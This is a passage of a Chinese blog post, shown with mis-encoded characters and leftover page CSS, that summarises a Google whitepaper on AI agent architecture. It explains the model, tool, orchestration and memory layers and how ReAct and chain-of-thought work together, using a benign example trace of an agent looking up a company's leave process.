a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>æœ¬æ–‡è¾ƒé•¿ï¼Œå»ºè®®ç‚¹èµæ”¶è—ã€‚æ›´å¤šAIå¤§æ¨¡å‹åº”ç”¨å¼€å‘å­¦ä¹ è§†é¢‘åŠèµ„æ–™ï¼Œåœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitcode.com%2FEnjoyEDU%2FLLM" target="_blank" title="https://gitcode.com/EnjoyEDU/LLM" ref="nofollow noopener noreferrer">è¿™é‡Œ</a>ã€‚</p>
</blockquote>
<p><em><strong>èŠ±äº†äº”ä¸ªå°æ—¶ï¼ŒæŠŠ Google ç™½çš®ä¹¦æ‹†è§£æˆä¸€ä¸ªå¯æ‰§è¡Œçš„ Agent å¿ƒæ™ºæ¨¡å‹çš„é•¿æ–‡ã€‚</strong></em></p>
<p><em><strong>æ²¡ä»€ä¹ˆèŠ±é‡Œèƒ¡å“¨çš„æ–°åè¯ï¼Œä½†æŠŠæ¨¡å‹ã€å·¥å…·ã€ç¼–æ’ã€è®°å¿†ã€è®­ç»ƒè¿™å‡ ä»¶æ ¸å¿ƒäº‹è®²å¾—æ¯”è¾ƒå®Œæ•´ï¼Œå¯¹äºæƒ³è¦äº†è§£çš„Agentçš„åˆå­¦è€…ï¼Œæ˜¯å¾ˆä¸é”™çš„é€‰æ‹©ã€‚</strong></em></p>
<p>Googleæœ€è¿‘å‘å¸ƒäº†ä¸€ç¯‡å…³äºAgenté•¿è¾¾60é¡µçš„æ–‡ä»¶ï¼š <strong>ã€Šåˆåˆ›å…¬å¸æŠ€æœ¯æŒ‡å—ï¼šAI Agentsã€‹</strong> ï¼Œè¿™ä»½æŠ¥å‘Šä»å®£ä¼ æ¥è¯´è¡¨è¾¾äº†è‡ªå·±ä¸ä¹‹å‰åç†è®ºçš„æ–‡ç« ä¸ä¸€æ ·ï¼Œä»–è¿˜æ˜¯æš´éœ²äº†ä¸å°‘ç»†èŠ‚æŠ€å·§ï¼Œå¯¹æ­£åœ¨åšAgentçš„å„ä½åº”è¯¥æœ‰äº›å¸®åŠ©ã€‚</p>
<p><strong>åªä¸è¿‡æˆ‘å®é™…è¯»ä¸‹æ¥ï¼ŒæŠ€å·§ä»€ä¹ˆçš„ç»™çš„å¾ˆä¸€èˆ¬ï¼Œä½†æ˜¯ä¸€ä»½éå¸¸ä¸é”™çš„Agentå…¥é—¨çº§å­¦ä¹ è¯»ç‰©</strong>ï¼Œæ‰€ä»¥ä¹Ÿæ¨èç»™å¤§å®¶ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fac9ec61e8e04f5897593ca42dd634e3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765943759&amp;x-signature=T4uFmKwLIpp%2F7YZn1%2BxwomV8YIs%3D" alt="" loading="lazy"/></p>
<p>é¦–å…ˆï¼ŒAgentçš„èƒ½åŠ›åŸºçŸ³ï¼ˆä¹Ÿå°±æ˜¯å¯¹å·¥å…·çš„è°ƒç”¨èƒ½åŠ›ï¼‰æ˜¯æ¨¡å‹çš„Function Calling**ï¼Œè€Œè¿™ä¸ªè¯†åˆ«å·¥å…·æ˜¯å¦åº”è¯¥è¢«è°ƒç”¨çš„èƒ½åŠ›æ˜¯å¾®è°ƒè®­ç»ƒçš„ç»“æœã€‚</p>
<p>æ¯”å¦‚ï¼ŒAgentå¯ä»¥ä½¿ç”¨æ•°æ®åº“å·¥å…·è·å–å®¢æˆ·è®¢å•åšä¸ªæ€§åŒ–æ¨èã€æ ¹æ®ç”¨æˆ·æŒ‡ä»¤è°ƒç”¨é‚®ä»¶ API å‘é€ç”µå­é‚®ä»¶ã€ç”šè‡³è‡ªåŠ¨æ‰§è¡Œé‡‘èäº¤æ˜“...</p>
<p>ä¸Šè¿°æ¯ä¸ªåŠŸèƒ½éƒ½éœ€è¦æ¨¡å‹ä¸å¤–éƒ¨ä¸–ç•Œï¼ˆå·¥å…·ã€æ•°æ®ï¼‰åšäº¤äº’ï¼Œåªè¦<strong>å…·å¤‡è‡ªä¸»è§„åˆ’å’Œå¤šæ­¥ä»»åŠ¡æ‰§è¡Œèƒ½åŠ›çš„ç³»ç»Ÿ</strong>ï¼Œå°±æ˜¯Agentã€‚</p>
<h2 data-id="heading-0">Agentæ¶æ„æ¦‚è§ˆ</h2>
<p>å†æ¬¡å¯„å‡ºè¿™ç« ç»å…¸Agentæ¶æ„å›¾ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/df239a5371c343df963835914e715945~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765943759&amp;x-signature=eKJ4wdIGJ%2FDxgBi%2BkU2d%2FVJODik%3D" alt="" loading="lazy"/></p>
<p>ç°ä»£Â AI Agent**Â é€šå¸¸ç”±å››å±‚æ ¸å¿ƒç»„ä»¶æ„æˆï¼š</p>
<p><strong>ä¸€ã€æ¨¡å‹å±‚ï¼š</strong></p>
<p>åŸºç¡€æ¨¡å‹ï¼ˆå¦‚å„ç±»å¤§å‹è¯­è¨€æ¨¡å‹ï¼‰ï¼Œè´Ÿè´£è‡ªç„¶è¯­è¨€ç†è§£ä¸ç”Ÿæˆï¼Œåœ¨ç”Ÿäº§åº”ç”¨é‡Œé¢å¾€å¾€ä¸ä¼šä¾èµ–å•ä¸€æ¨¡å‹ï¼Œç”šè‡³ä¼šæœ‰å¾ˆå¤šå°æ¨¡å‹å¾®è°ƒåœºæ™¯åšå…¶ä¸­ç®€å•ä»»åŠ¡ã€‚</p>
<p><strong>äºŒã€å·¥å…·å±‚ï¼š</strong></p>
<p>å¤–éƒ¨å·¥å…·å’ŒæœåŠ¡ï¼ŒåŒ…å«å„ç§APIå¦‚æ•°æ®åº“ã€æœç´¢å¼•æ“ç­‰ï¼Œå¸®åŠ©Agentæ„ŸçŸ¥å¤–éƒ¨ä¸–ç•Œå¹¶æ‰§è¡Œå®é™…æ“ä½œã€‚</p>
<p>ç°é˜¶æ®µæ¥è¯´ï¼ŒToolsæ˜¯AgentçœŸæ­£çš„æ ¸å¿ƒï¼Œè€Œä¸”<strong>Toolsè°ƒç”¨ä¸å‡†ä¹Ÿæ˜¯Agentæ¶æ„æœ€å¤§çš„éš¾ç‚¹</strong>ï¼Œå½“å‰æˆ‘ä»¬åœ¨ç”Ÿäº§ç¯å¢ƒä½¿ç”¨<strong>SkillsæŠ€æœ¯ + å¼ºæ„å›¾</strong>ä¹Ÿæœ€å¤šæŠŠå‡†ç¡®ç‡åšåˆ°90%å·¦å³ã€‚</p>
<p>æ‰€ä»¥ï¼Œæ•´ä¸ªAgentçš„æˆç†Ÿè¿˜ä»»é‡é“è¿œã€‚</p>
<p><strong>ä¸‰ã€ç¼–æ’å±‚ï¼š</strong></p>
<p>Agentçš„â€œå¤§è„‘â€ï¼Œè´Ÿè´£ç¼–å†™æç¤ºè¯ã€æ‰§è¡Œæ¨ç†æ¡†æ¶ã€ç»´æŠ¤å¯¹è¯çŠ¶æ€å’Œè°ƒç”¨å·¥å…·ã€‚è¯¥å±‚å®ç°äº†æ™ºèƒ½ä½“çš„è®¡åˆ’ã€æ¨ç†ã€å†³ç­–å’Œåé¦ˆå¾ªç¯ã€‚</p>
<p>è¿™æ ·è¯´å¤§å®¶å¯èƒ½å¬ä¸æ‡‚ï¼Œä¹Ÿå°±æ˜¯ReActæ¶æ„å°±æ˜¯è¿™é‡Œçš„ç¼–æ’å±‚äº†ï¼Œä¹Ÿæ˜¯ä¸»è¦ä»£ç ç»„æˆéƒ¨åˆ†ï¼š</p>
<ol>
<li>è´Ÿè´£ç»„ç»‡å†å²å¯¹è¯ï¼ˆçŠ¶æ€ï¼‰ï¼›</li>
<li>å†³å®šä»€ä¹ˆæ—¶å€™è°ƒç”¨æ¨¡å‹ï¼Œä»€ä¹ˆæ—¶å€™è°ƒç”¨å·¥å…·ï¼›</li>
<li>å†³å®šä»€ä¹ˆæ—¶å€™ç»“æŸæ¨ç†ï¼›</li>
<li>å†³å®šæ€ä¹ˆæ‹¼æç¤ºè¯ï¼›</li>
</ol>
<p>ä»–å®šä¹‰â€œæ¯ä¸€è½®â€é‡Œçš„è¯­è¨€ç”Ÿæˆç»“æ„ï¼ˆThoughtã€Actionã€Observationï¼‰</p>
<pre><code class="hljs language-scss" lang="scss">... â†’ æ¨ç†(Thought) â†’ è¡ŒåŠ¨(Action) â†’ è§‚å¯Ÿ(Observation) Â â†’ ...
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c810db4726ae44379b04cb9e011f053c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765943759&amp;x-signature=nd4WmUVUSyCJzkzlqjmm17M8ygw%3D" alt="" loading="lazy"/></p>
<p>ReAct = Reason + Actï¼š</p>
<ol>
<li><strong>Reasoningï¼š</strong> è®©LLM**æ€è€ƒ"ä¸ºä»€ä¹ˆ"å’Œ"å¦‚ä½•"æ‰§è¡Œè¡ŒåŠ¨ï¼›</li>
<li><strong>Actingï¼š</strong> è®©LLMæ‰§è¡Œå…·ä½“è¡ŒåŠ¨å¹¶ä¸ç¯å¢ƒäº¤äº’ï¼›</li>
<li><strong>å¾ªç¯åé¦ˆï¼š</strong> é€šè¿‡è§‚å¯Ÿç»“æœé©±åŠ¨ä¸‹ä¸€æ­¥æ¨ç†ï¼›</li>
</ol>
<p><strong>å››ã€è®°å¿†å±‚ï¼š</strong></p>
<p>åŒ…æ‹¬çŸ­æœŸè®°å¿†ï¼ˆå¯¹è¯ä¸Šä¸‹æ–‡ã€è¿‘æœŸäº¤äº’ï¼‰å’Œé•¿æœŸè®°å¿†ï¼ˆçŸ¥è¯†åº“ã€å†å²æ•°æ®ã€ä¸ªäººåå¥½ç­‰ï¼‰ã€‚è®°å¿†å±‚ç”¨äºå­˜å‚¨å’Œæ£€ç´¢ä¸ä»»åŠ¡ç›¸å…³çš„ä¿¡æ¯ï¼Œä»¥æ”¯æŒå¤šè½®äº¤äº’å’ŒçŸ¥è¯†è¡¥å……ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/11c44944fc6044c292951537d1a7fddf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765943759&amp;x-signature=VN%2FJfljkcXLhM8R4LM43J%2BrWnOI%3D" alt="" loading="lazy"/></p>
<p>ä¸¥æ ¼æ¥è¯´ï¼ŒAgentæœ€æ¼ç«çš„å°±æ˜¯è®°å¿†å±‚çš„å¤„ç†ï¼Œè¿™ä¹Ÿæ˜¯ä¸Šä¸‹æ–‡å·¥ç¨‹çš„æœ¬èº«ï¼Œä»–éœ€è¦è§£å†³<strong>æ•°æ®åº”è¯¥å¦‚ä½•ä¸AIäº¤äº’ï¼Œä¿è¯æ¯æ¬¡AIéƒ½èƒ½æ‹¿åˆ°ç›¸å…³æ•°æ®ã€‚</strong> è¿™é‡Œå±•å¼€æœ‰ä¸‰ç‚¹ï¼š</p>
<ol>
<li><strong>æ¯æ¬¡æ£€ç´¢èƒ½ä¸èƒ½æ‹¿åˆ°å¯¹åº”çš„æ•°æ®</strong>ï¼›</li>
<li><strong>æ•°æ®æ˜¯ä¸æ˜¯åˆé€‚</strong>ï¼Œè¿™å—çš„åˆé€‚åŒ…æ‹¬ä¼šä¸ä¼šå¤šã€ä¼šä¸ä¼šå°‘ï¼Œå¤šäº†è´¹Tokenæ˜¯å°äº‹ï¼Œä½†å¯èƒ½å¹²æ‰°æ¨¡å‹ã€å°‘äº†å°±å®¹æ˜“å‡ºé—®é¢˜ï¼›</li>
<li><strong>ç”Ÿæˆå¯¹ä¸å¯¹</strong>ï¼Œè¿™ä¸ªå»ºç«‹åœ¨æ£€ç´¢æ­£ç¡®ï¼Œæ•°æ®ç»„ç»‡æ­£ç¡®çš„æƒ…å†µä¸‹ï¼Œæ¨¡å‹æœ€ç»ˆè¾“å‡ºæ˜¯ä¸æ˜¯ç¬¦åˆé¢„æœŸï¼›</li>
</ol>
<p>è¿™é‡Œæ˜¯æ•´ä½“çš„äº¤äº’æ¶æ„å›¾ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/85d93ace4b3d4da1aaef1ac83e0f8f2f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765943759&amp;x-signature=XoXdTtPLSLkj8aOWxKuL%2BonzJw8%3D" alt="" loading="lazy"/></p>
<p>å›¾ç¤ºè€Œè¨€ï¼ŒAgentæ‰§è¡Œæµç¨‹å¯æ¦‚æ‹¬ä¸ºï¼š<strong>ç”¨æˆ·è¾“å…¥ â†’ ç¼–æ’å±‚å¤„ç† â†’ æ¨¡å‹ç”Ÿæˆæ€è·¯ â†’ å†³ç­–è°ƒç”¨å·¥å…·æˆ–è¾“å‡ºç»“æœ â†’ å·¥å…·æ‰§è¡Œè·å¾—åé¦ˆ â†’ æ›´æ–°è®°å¿†å¹¶ç»§ç»­å¾ªç¯ï¼Œç›´è‡³ç›®æ ‡å®Œæˆ</strong>ã€‚</p>
<p>åœ¨ ReAct æ¡†æ¶ä¸‹ï¼ŒAgenté‡å¤æ‰§è¡Œ<strong>æ€è€ƒï¼ˆThoughtï¼‰â†’è¡ŒåŠ¨ï¼ˆActionï¼‰â†’è§‚å¯Ÿï¼ˆObservationï¼‰</strong> çš„å¾ªç¯ï¼Œç›´åˆ°äº§ç”Ÿæœ€ç»ˆç­”æ¡ˆã€‚</p>
<p>æœ€åï¼Œä¸å•çº¯çš„æ¨¡å‹ï¼ˆLLMï¼‰ç›¸æ¯”ï¼ŒAgentæœ‰ä»¥ä¸‹å…³é”®åŒºåˆ«ï¼š</p>
<ol>
<li><strong>çŸ¥è¯†æ¥æºï¼š</strong> æ¨¡å‹åªèƒ½ä¾èµ–äºè®­ç»ƒæ•°æ®ï¼ŒçŸ¥è¯†é™æ€ï¼›è€ŒAgenté€šè¿‡å·¥å…·æ‰©å±•çŸ¥è¯†ï¼Œå¯ä»¥å®æ—¶è®¿é—®å¤–éƒ¨ä¿¡æ¯ã€‚</li>
<li><strong>ä¸Šä¸‹æ–‡ç®¡ç†ï¼š</strong> æ¨¡å‹å•æ¬¡æ¨ç†æ²¡æœ‰ä¼šè¯è®°å¿†ï¼›Agentå¯ä»¥ç»´æŠ¤äº¤äº’å†å²ï¼Œå®ç°å¤šè½®è¿ç»­å¯¹è¯ã€‚</li>
<li><strong>æ¨ç†æ¡†æ¶ï¼š</strong> æ¨¡å‹è¾“å‡ºç»“æœå¾€å¾€ä¾èµ–å•ä¸€æç¤ºï¼›Agentå…·å¤‡å†…ç½®çš„è®¤çŸ¥æ¶æ„å’Œæ¨ç†ç­–ç•¥ï¼ˆå¦‚é“¾å¼æ€ç»´ã€åæ€æ¡†æ¶ã€æ ‘å¼æ€ç»´ç­‰ï¼‰ï¼Œèƒ½å¤Ÿåœ¨ç¼–æ’å±‚ä¸­å¾ªç¯è¿­ä»£æ¨ç†æ­¥éª¤ï¼›</li>
</ol>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬å…·ä½“å±•å¼€è¯´ä¸‹Agentçš„å››ä¸ªæ ¸å¿ƒç»„ä»¶ï¼š</p>
<h2 data-id="heading-1">ç¼–æ’å±‚ä¸è®¤çŸ¥æ¶æ„</h2>
<p>ç¼–æ’å±‚æ˜¯æ™ºèƒ½ä½“ç³»ç»Ÿçš„æ ¸å¿ƒæ§åˆ¶å•å…ƒï¼Œè´Ÿè´£ç»„ç»‡ä¿¡æ¯æµå’Œæ‰§è¡Œæ¨ç†å¾ªç¯ã€‚å®ƒæ¨¡æ‹Ÿäººç±»åœ¨åšå¤æ‚ä»»åŠ¡æ—¶çš„è®¤çŸ¥è¿‡ç¨‹ï¼šå…ˆè·å–ä¿¡æ¯ã€ç„¶ååˆ¶å®šè®¡åˆ’ã€æ‰§è¡Œè¡ŒåŠ¨ã€å†æ ¹æ®åé¦ˆè°ƒæ•´è®¡åˆ’ï¼Œä¸æ–­å¾ªç¯ç›´åˆ°å®Œæˆç›®æ ‡ã€‚</p>
<p>ä¸€ä¸ªå¸¸è§çš„æ¯”å–»æ˜¯ <strong>â€œå¨å¸ˆå‡†å¤‡å¤æ‚èœå“â€</strong> ï¼šå¨å¸ˆä¼šæ ¹æ®é¡¾å®¢éœ€æ±‚è·å–é£Ÿæä¿¡æ¯ï¼Œæ€è€ƒçƒ¹é¥ªæ­¥éª¤ï¼Œç„¶åå®é™…çƒ¹é¥ªï¼Œè¿‡ç¨‹ä¸­å¯èƒ½æ ¹æ®å‘³é“åé¦ˆä¸æ–­è°ƒæ•´æ–¹æ³•ã€‚</p>
<p>ç±»ä¼¼çš„ï¼ŒAgentçš„ç¼–æ’å±‚ä¼šæŒ‰ç…§è®¾å®šçš„æ¨ç†æ¡†æ¶åå¤è¿­ä»£ï¼Œé©±åŠ¨æ¨¡å‹ç”Ÿæˆâ€œæ€è€ƒâ€å¹¶åšå‡ºâ€œè¡ŒåŠ¨â€å†³ç­–ã€‚</p>
<p>å¸¸è§çš„æ¨ç†æ¡†æ¶å¤§åŒå°å¼‚ï¼Œè¿™é‡Œä¸€å®šéœ€è¦äº†è§£çš„æ˜¯ä¸¤ä¸ªä¸œè¥¿**ReActä¸CoT****ï¼Œé™¤æ­¤ä¹‹å¤–å¯ä»¥å»¶ä¼¸åˆ°ToTï¼š</p>
<p><strong>ReAct</strong>åœ¨å‰é¢æˆ‘ä»¬åšäº†åŸºç¡€ä»‹ç»ï¼Œè¯¥æ¡†æ¶<strong>å¼ºè°ƒæ¨¡å‹åœ¨å›ç­”å‰è¿›è¡Œè¿ç»­çš„å†…çœå’Œè¡ŒåŠ¨é€‰æ‹©ï¼Œæœ‰åŠ©äºæé«˜ç­”æ¡ˆçš„å‡†ç¡®åº¦å’Œå¯è¿½æº¯æ€§</strong>ï¼›</p>
<p><strong>CoTï¼ˆæ€ç»´é“¾ï¼‰</strong> å¼•å¯¼æ¨¡å‹é€šè¿‡ç”Ÿæˆä¸­é—´æ¨ç†æ­¥éª¤æ¥åˆ†è§£é—®é¢˜ï¼Œä¿ƒä½¿å…¶åœ¨æœ€ç»ˆç­”æ¡ˆå‰å…ˆåˆ—ä¸¾æ€è€ƒè¿‡ç¨‹ï¼Œè¿™ç§æ¡†æ¶å¯ä»¥<strong>å¢å¼ºæ¨¡å‹è§£å†³å¤æ‚é—®é¢˜æ—¶çš„å‡†ç¡®æ€§</strong>ï¼ˆå¹»è§‰é—®é¢˜ï¼‰ã€‚</p>
<p><strong>ToTï¼ˆæ€ç»´æ ‘ï¼‰</strong> æ˜¯åœ¨ CoT çš„åŸºç¡€ä¸Šï¼Œå…è®¸æ¨¡å‹åœ¨å¤šä¸ªå¤‡é€‰æ€è·¯é—´åšæ¯”è¾ƒï¼Œé€‚ç”¨äºéœ€è¦æ¢ç´¢å¤šç§æ–¹æ¡ˆçš„ç­–ç•¥æ€§ä»»åŠ¡ï¼Œç›®çš„ä¾æ—§æ˜¯æå‡å¯¹å¤æ‚é—®é¢˜çš„è§£å†³èƒ½åŠ›ã€‚</p>
<p>ç¯‡å¹…æœ‰é™ï¼Œæˆ‘ä»¬åªè®¨è®ºReActå’ŒCoTçš„é…åˆå³å¯ï¼ˆå…¶ä»–çš„éƒ½ç±»ä¼¼ï¼‰ï¼š</p>
<h3 data-id="heading-2">ReActå’ŒCoT</h3>
<p>é¦–å…ˆï¼ŒReActä¸CoTéƒ½æ˜¯æ¨ç†ç­–ç•¥æ¡†æ¶ä¹Ÿå°±æ˜¯Agentå››å¤§ç»„ä»¶æ ¸å¿ƒçš„ç¼–æ’å±‚å…·è±¡åŒ–å®ç°ï¼Œä»–ä»¬éƒ½æè¿°çš„æ˜¯<strong>å¦‚ä½•ç»„ç»‡æ¨¡å‹çš„æ¨ç†è¿‡ç¨‹ã€ç”Ÿæˆæ­¥éª¤ã€æç¤ºè¯ç»“æ„ã€‚</strong></p>
<p>æ¢å¥è¯è¯´ï¼ŒReActæ˜¯ä»£ç çš„æ ¸å¿ƒï¼Œæ˜¯AIå·¥ç¨‹çš„æ ¸å¿ƒï¼Œä»–ä¼šå†³å®šå¦‚ä½•å»ä¸è®°å¿†ç³»ç»Ÿã€å·¥å…·ç³»ç»Ÿåšé…åˆã€‚</p>
<p>ç„¶åï¼ŒReActé€»è¾‘ä¸Šä¸CoTæ˜¯åŒçº§åˆ«çš„ï¼Œä½†ç°åœ¨æ›´å¤šçš„æ˜¯åœ¨ç»„åˆä½¿ç”¨ï¼Œæ˜¾å¾—CoTæ˜¯ReActçš„ä¸€ä¸ªè¿‡ç¨‹äº§ç‰©ï¼Œå…¶å®å¹¶ä¸æ˜¯çš„ï¼Œé€»è¾‘ä¸ŠCoTä¹Ÿå¯ä»¥è°ƒç”¨å·¥å…·ï¼›</p>
<p>åªä¸è¿‡ç°åœ¨ä»æµè¡ŒèŒƒå¼çš„è§’åº¦æ¥è¯´ï¼ŒReActè¢«ç”¨ä½œä¸»æ¡†æ¶çš„æ—¶é—´ä¼šå¤šä¸€ç‚¹ï¼Œå¹¶ä¸”è¿‡ç¨‹ä¸­ä¼šåŒ…å«å¾ˆå¤šCoTçš„éƒ¨åˆ†ï¼Œè¿™é‡Œçš„ç»“æœæ˜¯ï¼š<strong>ReAct æ˜¯å®¹å™¨ï¼ŒCoT æ˜¯å†…å®¹ã€‚ReAct æ˜¯æœ€â€œAgentâ€åŒ–çš„ã€CoT æ˜¯æœ€åŸºç¡€çš„</strong>ã€‚</p>
<blockquote>
<p>ReAct è§„å®šäº†ï¼šå…ˆæ€è€ƒï¼ˆThoughtï¼‰â†’ è¡ŒåŠ¨ï¼ˆActionï¼‰â†’ ç­‰å¾…ç»“æœï¼ˆObservationï¼‰â†’ å†æ€è€ƒ...</p>
<p>è€Œè¿™ä¸ªâ€œThoughtâ€æ€ä¹ˆå†™ï¼Ÿé€šå¸¸å°±æ˜¯ä¸€ä¸ª Chain of Thought æ¨ç†å—ã€‚</p>
</blockquote>
<p>ä¸¾ä¸ªç®€å•ä¾‹å­ï¼š</p>
<p>è®© Agent å›ç­” <strong>â€œæŸå…¬å¸å‘˜å·¥è¯·å‡æµç¨‹â€</strong> çš„é—®é¢˜ï¼ŒAgent éœ€è¦ï¼š</p>
<ol>
<li>è¯»å–ç”¨æˆ·çš„é—®é¢˜</li>
<li>ä»çŸ¥è¯†åº“ä¸­æ£€ç´¢æ–‡æ¡£</li>
<li>åˆ†æå†…å®¹ç»“æ„</li>
<li>è¾“å‡ºæ¸…æ™°æ­¥éª¤</li>
</ol>
<p>è¿™å—çš„ç®€è¦æµç¨‹æ˜¯ï¼š</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-symbol">User:</span> è¯·é—®æˆ‘ä»¬å…¬å¸è¯·å‡æµç¨‹æ˜¯ä»€ä¹ˆï¼Ÿ

<span class="hljs-keyword">Step</span> <span class="hljs-number">1</span>:
<span class="hljs-symbol">Thought:</span> å…ˆæŸ¥æ‰¾å…³äºâ€œè¯·å‡æµç¨‹â€çš„æ–‡æ¡£ã€‚
<span class="hljs-symbol">Action:</span> search_docs(<span class="hljs-string">"è¯·å‡æµç¨‹"</span>)
<span class="hljs-symbol">Observation:</span> æ‰¾åˆ°æ–‡æ¡£ã€Šå‘˜å·¥æ‰‹å†Œã€‹ç¬¬<span class="hljs-number">4</span>ç« ï¼Œåˆ—å‡ºäº†æµç¨‹æ­¥éª¤ã€‚

<span class="hljs-keyword">Step</span> <span class="hljs-number">2</span>:
<span class="hljs-symbol">Thought:</span>
é¦–å…ˆè¯»å–è¿™éƒ¨åˆ†å†…å®¹ï¼Œç†è§£æµç¨‹çš„é¡ºåºã€‚
- ç¬¬ä¸€æ­¥æ˜¯å‘˜å·¥æäº¤è¯·å‡ç”³è¯·
- ç¬¬äºŒæ­¥æ˜¯ç›´å±ä¸Šçº§å®¡æ‰¹
- ç¬¬ä¸‰æ­¥æ˜¯HRå¤‡æ¡ˆ
å› æ­¤æˆ‘å¯ä»¥ç»„ç»‡ä¸€ä»½æ¸…æ™°çš„å›ç­”ã€‚

<span class="hljs-symbol">Action:</span> None
Final Answer: è¯·å‡æµç¨‹å¦‚ä¸‹ï¼š<span class="hljs-number">1</span>ï¼‰æäº¤ç”³è¯·ï¼›<span class="hljs-number">2</span>ï¼‰ä¸»ç®¡å®¡æ‰¹ï¼›<span class="hljs-number">3</span>ï¼‰HRå¤‡æ¡ˆã€‚
</code></pre>
<p>è¿™ä¸ª â€œStep 2â€ çš„ Thought éƒ¨åˆ†å°±æ˜¯ä¸€ä¸ªç®€å•çš„Â <strong>CoT</strong>ï¼Œæ¨¡å‹åœ¨æ²¡æœ‰è¡ŒåŠ¨å‰ï¼Œåˆ†æ­¥æ€è€ƒã€æå–ã€ç»„ç»‡ä¿¡æ¯ï¼Œè¿™æ˜¯å…¸å‹çš„æ€ç»´é“¾ã€‚</p>
<p>ä¸ºä»€ä¹ˆè¿™ä¹ˆç”¨ä¹Ÿå¾ˆç®€å•ï¼šAgentæ¶æ„ä¸­ä¹Ÿä¸å¯èƒ½æ¯ä¸€æ­¥éƒ½è°ƒç”¨å·¥å…·ï¼Œå¾ˆå¤šæ—¶å€™åªæ˜¯åœ¨â€œç»„ç»‡æ€ç»´/è¯­è¨€â€ï¼ŒCoTå¯ä»¥æœ‰æ•ˆé™ä½å¹»è§‰ç‡ã€‚</p>
<p>æ€»è€Œè¨€ä¹‹ï¼ŒReAct æ¡†æ¶é‡Œå¯ä»¥æœ‰å¾ˆå¤š CoT å†…å®¹ç©¿æ’å…¶ä¸­ï¼Œè¿™ç§ç»„åˆä¹Ÿæ˜¯æœ€å¸¸è§ã€æœ€ç¨³çš„åšæ³•ï¼Œå¤§å®¶è®°ä½è¿™ç‚¹å°±è¡Œï¼Œè¿™å°±æ˜¯Agentçš„ç¼–æ’å±‚ã€‚</p>
<p>å†ç»“åˆGoogleæŠ¥å‘Šçš„æ¡ˆä¾‹ï¼Œå¤§å®¶åº”è¯¥å¯ä»¥å®Œå…¨ç†è§£äº†ï¼š</p>
